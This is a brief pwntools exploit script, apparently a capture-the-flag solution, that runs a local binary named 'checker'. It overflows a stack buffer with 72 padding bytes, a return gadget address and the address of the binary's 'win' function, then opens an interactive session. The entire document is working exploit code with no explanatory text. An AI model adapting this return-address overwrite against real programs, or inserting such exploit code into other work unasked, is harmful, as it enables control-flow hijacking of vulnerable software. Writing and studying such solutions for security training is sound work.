from pwn import *
exe = context.binary = ELF('./checker')

io = process(exe.path)
io.sendlineafter(b":", b"A"*72 + p64(0x40101a) + p64(exe.sym.win))
io.interactive()
